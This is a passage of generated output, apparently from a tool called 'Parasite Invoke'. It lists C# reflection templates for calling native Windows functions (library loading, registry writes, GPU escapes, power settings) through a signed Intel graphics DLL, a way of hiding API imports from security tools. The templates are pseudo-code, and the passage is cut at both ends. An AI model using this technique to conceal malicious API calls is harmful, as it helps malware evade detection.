        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiDestroyDeviceInfoList"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo });
        ===END SIGNATURE===

Method: CreateDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpszDriver, string lpszDevice, string lpszOutput, uint lpInitData });
        ===END SIGNATURE===

Method: DeleteDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DeleteDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc });
        ===END SIGNATURE===

Method: D3DKMTOpenAdapterFromHdc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTOpenAdapterFromHdc"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { D3DKMT_OPENADAPTERFROMHDC& Arg });
        ===END SIGNATURE===

Method: D3DKMTCloseAdapter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTCloseAdapter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { D3DKMT_CLOSEADAPTER& Arg });
        ===END SIGNATURE===

Method: D3DKMTEscape
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTEscape"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus) methodInfo.Invoke(null, new object[] { D3DKMT_ESCAPE& escapeData });
        ===END SIGNATURE===

Method: D3DKMTOpenAdapterFromDeviceName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTOpenAdapterFromDeviceName"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { D3DKMT_OPENADAPTERFROMDEVICENAME& deviceArgs });
        ===END SIGNATURE===

Method: D3DKMTQueryAdapterInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTQueryAdapterInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus) methodInfo.Invoke(null, new object[] { D3DKMT_QUERYADAPTERINFO& deviceArg });
        ===END SIGNATURE===

Method: LoadLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LoadLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string path });
        ===END SIGNATURE===

Method: GetProcAddress
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetProcAddress"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hModule, string procName });
        ===END SIGNATURE===

Method: FreeLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""FreeLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hModule });
        ===END SIGNATURE===

Method: LoadPackagedLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LoadPackagedLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string libFileName, uint Reserved });
        ===END SIGNATURE===

Method: SetDeviceGammaRamp
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetDeviceGammaRamp"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDC, RAMP& lpRamp });
        ===END SIGNATURE===

Method: GetDeviceGammaRamp
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDeviceGammaRamp"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDC, RAMP& lpRamp });
        ===END SIGNATURE===

Method: GetDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hWnd });
        ===END SIGNATURE===

Method: ReleaseDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ReleaseDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, IntPtr hDC });
        ===END SIGNATURE===

Method: RegisterHotKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterHotKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int id, int fsModifiers, Keys vk });
        ===END SIGNATURE===

Method: UnregisterHotKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""UnregisterHotKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int id });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: SendMessage
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SendMessage"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam });
        ===END SIGNATURE===

Method: RegisterWindowMessage
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterWindowMessage"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { string lpString });
        ===END SIGNATURE===

Method: RegCloseKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCloseKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey });
        ===END SIGNATURE===

Method: RegQueryValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegQueryValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int lpReserved, Int32& type, IntPtr lpData, Int32& lpcbData });
        ===END SIGNATURE===

Method: RegQueryValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegQueryValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int lpReserved, Int32& type, StringBuilder lpData, Int32& lpcbData });
        ===END SIGNATURE===

Method: RegOpenKeyEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegOpenKeyEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string subKey, int ulOptions, uint samDesired, IntPtr& hkResult });
        ===END SIGNATURE===

Method: RegSetValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegSetValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int Reserved, RegistryValueKind dwType, IntPtr lpData, int cbData });
        ===END SIGNATURE===

Method: RegCreateKeyA
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCreateKeyA"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { uint hKey, string lpSubKey, IntPtr phkResult });
        ===END SIGNATURE===

Method: RegCreateKeyEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCreateKeyEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpSubKey, int Reserved, string lpClass, RegOption dwOptions, RegSAM samDesired, IntPtr lpSecurityAttributes, IntPtr& phkResult, RegResult& lpdwDisposition });
        ===END SIGNATURE===

Method: RegisterDeviceNotification
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterDeviceNotification"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hRecipient, IntPtr NotificationFilter, uint Flags });
        ===END SIGNATURE===

Method: PowerSetActiveScheme
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerSetActiveScheme"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr UserPowerKey, Guid& ActivePolicyGuid });
        ===END SIGNATURE===

Method: PowerGetActiveScheme
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerGetActiveScheme"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr UserPowerKey, IntPtr& ActivePolicyGuid });
        ===END SIGNATURE===

Method: PowerReadFriendlyName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadFriendlyName"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr RootPowerKey, Guid& SchemeGuid, IntPtr SubGroupOfPowerSettingsGuid, IntPtr PowerSettingGuid, IntPtr Buffer, UInt32& BufferSize });
        ===END SIGNATURE===

Method: PowerReadDCValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadDCValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, UInt32& DcValueIndex });
        ===END SIGNATURE===

Method: PowerWriteDCValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerWriteDCValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, uint DcValueIndex });
        ===END SIGNATURE===

Method: PowerReadACValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadACValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, UInt32& DcValueIndex });
        ===END SIGNATURE===

Method: PowerWriteACValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerWriteACValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, uint DcValueIndex });
        ===END SIGNATURE===

Method: RegisterPowerSettingNotification
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterPowerSettingNotification"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hRecipient, Guid& PowerSettingGuid, int Flags });
        ===END SIGNATURE===

Method: GetSystemPowerStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetSystemPowerStatus"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { SYSTEM_POWER_STATUS& systemPowerStatus });
        ===END SIGNATURE===

Method: clGetPlatformIDs
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformIDs"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { uint numEntries, PlatformID[] platforms, UInt32& numPlatforms });
        ===END SIGNATURE===

Method: clGetPlatformInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { PlatformID platform, PlatformInfo param_name, IntPtr param_value_size, Byte[] param_value, IntPtr& param_value_size_ret });
        ===END SIGNATURE===

Method: CreateDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateDC"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData });
        ===END SIGNATURE===

Method: clGetPlatformInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformInfo"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { PlatformID platform, PlatformInfo param_name, IntPtr param_value_size, IntPtr param_value, IntPtr& param_value_size_ret });
        ===END SIGNATURE===

Method: ChoosePixelFormat
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChoosePixelFormat"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hdc, PixelFormatDescriptor& pfd });
        ===END SIGNATURE===

Method: SetPixelFormat
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetPixelFormat"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc, int iPixelFormat, PixelFormatDescriptor& pfd });
        ===END SIGNATURE===

Method: wglCreateContext
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglCreateContext"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hdc });
        ===END SIGNATURE===

Method: wglMakeCurrent
        ===PARASITE INVOKE SIGNATURE===
